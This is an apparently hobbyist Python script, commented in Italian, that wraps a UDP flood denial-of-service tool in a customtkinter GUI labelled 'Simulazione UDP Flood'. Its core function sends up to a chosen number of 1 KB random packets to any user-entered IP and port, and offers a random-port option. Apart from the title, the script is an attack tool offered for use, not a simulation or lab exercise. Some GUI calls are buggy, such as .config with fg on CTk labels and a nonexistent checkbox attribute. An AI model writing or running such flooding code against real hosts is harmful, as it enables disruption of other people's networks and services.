import socket
import random
import time
import customtkinter as ctk

# Funzione per generare pacchetti di 1 KB
def generate_packet():
    return random._urandom(1024)  # 1024 byte (1 KB)

# Funzione per lanciare l'attacco UDP Flood
def udp_flood(target_ip, target_port, num_packets):
    try:
        # Creazione del socket UDP
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        
        # Contatore pacchetti inviati
        sent_packets = 0
        
        status_label.config(text=f"Inizio attacco UDP flood su {target_ip}:{target_port}", fg="green")
        
        # Ciclo per inviare i pacchetti
        for _ in range(num_packets):
            packet = generate_packet()
            sock.sendto(packet, (target_ip, target_port))
            sent_packets += 1
            if sent_packets % 100 == 0:
                status_label.config(text=f"{sent_packets} pacchetti inviati.", fg="orange")
                window.update()  # Aggiorna la finestra ogni 100 pacchetti
            
            # Aggiungi un piccolo ritardo (opzionale per non sovraccaricare troppo velocemente)
            time.sleep(0.01)
        
        status_label.config(text=f"\nAttacco completato. {sent_packets} pacchetti inviati al target.", fg="blue")
    
    except Exception as e:
        status_label.config(text=f"Errore: {e}", fg="red")
    finally:
        sock.close()

# Funzione per generare una porta casuale
def generate_random_port():
    return random.randint(1024, 49151)

# Funzione chiamata al click del pulsante "Start"
def start_attack():
    target_ip = ip_entry.get()
    target_port = int(port_entry.get()) if not random_port_checkbox.var.get() else generate_random_port()
    num_packets = int(packets_entry.get())
    
    # Avvia l'attacco UDP
    udp_flood(target_ip, target_port, num_packets)

# Creazione della finestra principale
window = ctk.CTk()
window.title("Simulazione UDP Flood")
window.geometry("500x400")

# Titolo
title_label = ctk.CTkLabel(window, text="Simulazione UDP Flood", font=("Arial", 18))
title_label.pack(pady=20)

# IP Target
ip_label = ctk.CTkLabel(window, text="IP della macchina target:")
ip_label.pack()
ip_entry = ctk.CTkEntry(window, placeholder_text="Inserisci IP del target")
ip_entry.pack(pady=5)

# Porta Target
port_label = ctk.CTkLabel(window, text="Porta UDP della macchina target:")
port_label.pack()
port_entry = ctk.CTkEntry(window, placeholder_text="Inserisci la porta (o lascia vuoto per random)")
port_entry.pack(pady=5)

# Checkbox per selezionare una porta casuale
random_port_checkbox = ctk.CTkCheckBox(window, text="Seleziona porta casuale", variable=ctk.BooleanVar(value=False))
random_port_checkbox.pack()

# Numero di pacchetti
packets_label = ctk.CTkLabel(window, text="Numero di pacchetti da inviare:")
packets_label.pack()
packets_entry = ctk.CTkEntry(window, placeholder_text="Inserisci il numero di pacchetti")
packets_entry.pack(pady=5)

# Pulsante per avviare l'attacco
start_button = ctk.CTkButton(window, text="Avvia Attacco", command=start_attack)
start_button.pack(pady=20)

# Etichetta per il feedback dello stato
status_label = ctk.CTkLabel(window, text="Pronto per avviare l'attacco.", text_color="black")

status_label.pack(pady=10)

# Avvia la finestra
window.mainloop()
